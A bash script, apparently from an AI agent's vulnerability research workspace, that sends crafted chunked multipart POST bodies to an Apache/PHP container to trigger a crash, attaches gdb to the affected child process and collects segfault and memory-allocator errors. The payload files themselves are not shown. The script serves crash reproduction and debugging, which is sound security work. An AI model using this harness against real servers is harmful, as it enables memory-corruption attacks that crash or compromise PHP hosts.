#!/bin/bash
# usage: run_crash.sh <container> <port> <health_path> <a1_path> <b1_path> <outdir>
set -u
C=$1; P=$2; H=$3; A=$4; B=$5; O=$6
T=$(cat /tmp/opencode/.mw109619_current)
mkdir -p "$O"
docker restart "$C" >/dev/null; sleep 1.5
for i in $(seq 1 40); do curl -s -o /dev/null "http://127.0.0.1:$P$H" && break; sleep 0.3; done
curl -s -o /dev/null "http://127.0.0.1:$P$H"
sleep 0.2
python3 - "$P" "$A" <<'PY'
import socket,sys
port=int(sys.argv[1]); path=sys.argv[2]
body=open('/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies/a1.bin','rb').read()
b=b'C'*10
hdr=("POST %s HTTP/1.1\r\nHost: h\r\nContent-Type: multipart/form-data; boundary=%s\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"%(path,b.decode())).encode()
req=bytearray(hdr)
for i in range(0,len(body),65536):
    pc=body[i:i+65536]; req+=("%x\r\n"%len(pc)).encode()+pc+b"\r\n"
req+=b"0\r\n\r\n"
s=socket.create_connection(('127.0.0.1',port),timeout=120); s.settimeout(120)
s.sendall(req); out=bytearray()
try:
    while len(out)<100000:
        c=s.recv(65536)
        if not c: break
        out.extend(c)
except OSError: pass
s.close()
print("A1", out.split(b"\r\n",1)[0].decode('latin1','replace'), len(out))
PY
sleep 0.3
R=$(docker exec "$C" cat /var/log/apache2/p2s-access.log | grep " POST " | tail -1)
PID=$(echo "$R" | awk '{print $1}')
echo "A1_CHILD $PID  ($R)"
echo "== children before attach =="
docker exec "$C" ps -o pid,ppid,user,rss,args -C apache2
# gdb catch script
docker exec -i "$C" sh -c 'cat > /tmp/trace.gdb' < '/tmp/opencode/research/mw_109619_20261023T010708Z/work/trace_hdr.gdb'
docker exec -d "$C" sh -c 'gdb -q -p '"$PID"' -batch -x /tmp/trace.gdb > /tmp/gdb.out 2>&1'
sleep 1.5
echo "== gdb attached? =="
docker exec "$C" cat /proc/$PID/status | grep -E 'State|TracerPid'
# send 5 B1 bodies; i4 should hit the A1 child by round-robin
python3 - "$P" "$B" <<'PY'
import socket,sys,time
sys.path.insert(0,'/tmp/opencode/research/9bie_addendum_20261022T160000Z/scripts')
import chain_app as ca
port=int(sys.argv[1]); path=sys.argv[2]
body=open('/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies/b1_800k.bin','rb').read()
for i in range(5):
    t0=time.time()
    try:
        r=ca.send_chunked(port,path,body,120)
        print("B1",i,ca.status_of(r),len(r))
    except OSError as e:
        print("B1",i,"ERR",repr(e))
PY
docker exec "$C" sh -c 'kill -INT $(pidof gdb) 2>/dev/null || true'
sleep 1
echo "== gdb output =="
docker exec "$C" cat /tmp/gdb.out
echo "== children after =="
docker exec "$C" ps -o pid,ppid,user,rss,args -C apache2
echo "== access log tail =="
docker exec "$C" cat /var/log/apache2/p2s-access.log | tail -8
echo "== php errors =="
docker logs "$C" --since 4m 2>&1 | grep -E 'PHP (Fatal|Warning|Notice)|segfault|SIGSEGV|zend_mm|child pid' | tail -20
